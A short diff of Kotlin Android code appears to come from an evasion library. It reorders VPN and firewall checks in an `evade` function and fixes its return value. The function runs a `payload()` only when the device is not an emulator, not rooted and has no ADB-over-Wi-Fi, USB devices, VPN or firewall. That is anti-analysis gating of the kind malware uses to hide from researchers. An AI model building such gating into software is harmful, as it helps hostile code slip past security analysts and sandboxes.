@@ -80,10 +80,10 @@ inline suspend fun Context.evade(dispatcher: CoroutineDispatcher = Dispatchers.D
         var hasFirewall: Deferred<Boolean>? = null
         var hasVpn: Deferred<Boolean>? = null
         if(requiresNetwork){
-            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
-                hasVpn = async { hasVPN() }
             if(Build.VERSION.SDK_INT < Build.VERSION_CODES.R)
                 hasFirewall = async { hasFirewall() }
+            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
+                hasVpn = async { hasVPN() }
         }
         if( !isEmulator.await() && !isRooted.await() && !hasAdbOverWifi.await() && !isConnected.await() && !hasUsbDevices.await() && !(hasVpn?.let { it.await() } ?: false) && !(hasFirewall?.let { it.await() } ?: false)){
             launch { payload() }.join()
@@ -91,7 +91,7 @@ inline suspend fun Context.evade(dispatcher: CoroutineDispatcher = Dispatchers.D
         }
         onEvade = OnEvade.Escape(false)
     }
-    return OnEvade.Escape(false)
+    return onEvade
 }
 
 class OnEvade{
